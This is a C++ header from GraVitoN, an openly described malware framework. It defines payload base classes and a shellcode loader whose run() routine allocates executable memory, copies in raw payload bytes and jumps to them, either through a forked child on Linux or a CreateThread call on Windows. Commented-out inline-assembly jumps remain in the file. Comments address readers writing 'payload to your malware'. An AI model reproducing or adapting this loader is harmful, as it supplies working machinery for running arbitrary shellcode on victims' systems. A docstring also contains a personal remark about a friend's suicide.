/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief GraVitoN::Payload and GraVitoN::Bin_Payload
 *
 */

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_PAYLOAD_HEAD_
#define _GVN_PAYLOAD_HEAD_

#include <graviton.hpp>
#include <core/memory.hpp>

#if defined(INFO_OS_LINUX)
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <unistd.h>
#elif defined(INFO_OS_OSX)
#include <sys/mman.h>
#include <errno.h>
#elif defined(INFO_OS_WINDOWS)
// #include <WinBase.h>
#include <windows.h>
#endif

#include <string>
#include <cstring>
using namespace std;

/// @note Never test remote payloads on '127.0.0.1' always set some non-localhost IP!

namespace GraVitoN
{
    namespace Payload
    {
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief Payload execution class
 *
 * You want to code new payload to your malware? This where you should
 * start.\n \n \n
 * <b> I'm Drunk, and Sadjad (void), My Best Friend Is Dead (Suicide). =( [07/02/12] </b>
 * 
 */
        class Payload_Component : public Core::Component
        {
        public:
            /// Constructor
            Payload_Component();

            /// Destructor
            virtual ~Payload_Component();

            /**
             * @brief CALL your payload
             *
             * After you initialized your payload, this is the exact time you should call 'call' method
             *
             * @return
             * True if it's done successfully
             * 
             */
            virtual bool run() = 0;
        };

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief Binary payload class
 *
 * If you want to design a class to load a binary shell use this class.
 *
 * @note To build binary payloads you need to disable optimization flag (-O0)
 *
 */
        class Binary_Payload : public Payload_Component
        {
        private:
            /// Start address of your payload
            Core::Memory<unsigned char> jumper;
            
        protected:
            virtual bool initPayload() = 0;

            /// Payload Hex Array
            unsigned char *payload;

            /// Size of your payload in bytes
            int payload_size;

        public:
            Binary_Payload();
            ~Binary_Payload();

            virtual bool run();
        };

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        Payload_Component::Payload_Component()
        {
        }

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        Payload_Component::~Payload_Component()
        {
        }

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        Binary_Payload::Binary_Payload()
        {
        }

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
        Binary_Payload::~Binary_Payload()
        {
            try
            {
//		if( payload )
//			delete payload;
            }
            catch(...)
            {
                Core::Logger::logItLn("Bin_Payload::~Bin_Payload Exception");
            }
        }

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/// @todo android and ios support
        bool Binary_Payload::run()
        {
            /// payload_size + <some space for stage2>
            if( !jumper.allocExec( (payload_size) * sizeof ( unsigned char ) + 32768 ) )
                return false;
            
            jumper.copy( ( void * ) payload, (payload_size) * sizeof ( unsigned char ) );

#if defined(INFO_OS_LINUX)
            /// Fork
            Core::Logger::logItLn ("Forking...");
            int pid = fork();

            /// If i'm child process
            if ( pid == 0 )
            {
#endif
                /// A Little OS Independent Delay!
                int _delay = 320;
                while ( _delay > 0 )
                {
                    --_delay;
                }

                /// Jump to payload

#if defined(INFO_CPU_X64)
                Core::Logger::logItLn ( "Jumping to Payload (64bit)..." );
#if defined(INFO_OS_WINDOWS)
                /// Cool!
                HANDLE trd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)jumper, NULL, 0, NULL);
                WaitForSingleObject(trd, INFINITE);
#else
                jumper.call();
#endif
                /// Old technique
                /*
                  int useless_out = 0;
                  asm (
                  "mov %1, %%rbx;"
                  "jmp *%%rbx;"
                  : "=r" ( useless_out )
                  : "r" ( jumper )
                  : "%rbx"
                  );
                */
#elif defined(INFO_CPU_X86)
                Core::Logger::logItLn ( "Jumping to Payload (32bit)..." );
#if defined(INFO_OS_WINDOWS)
                /// Cool!
                HANDLE trd = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)jumper, NULL, 0, NULL);
                WaitForSingleObject(trd, INFINITE);
#else
                jumper.call();
#endif
                /// Old technique
                /*
                  int useless_out = 0;
                  asm (
                  "mov %1, %%ebx;"
                  "jmp *%%ebx;"
                  : "=r" ( useless_out )
                  : "r" ( jumper )
                  : "%ebx"
                  );
                */
#else
                Core::Logger::logItLn ( "Jumping to Payload (unk)..." );
                jumper.call();
#endif

#if defined(INFO_OS_LINUX)
                exit(0);
            }

            /// While Child is runnig
            while( waitpid(pid, NULL, 0) > 0 )
                sleep(0.01);
#endif // INFO_OS_LINUX

            Core::Logger::logItLn ( "call > done" );
            return true;
        }

    }
}

#endif // _GVN_PAYLOAD_HEAD_
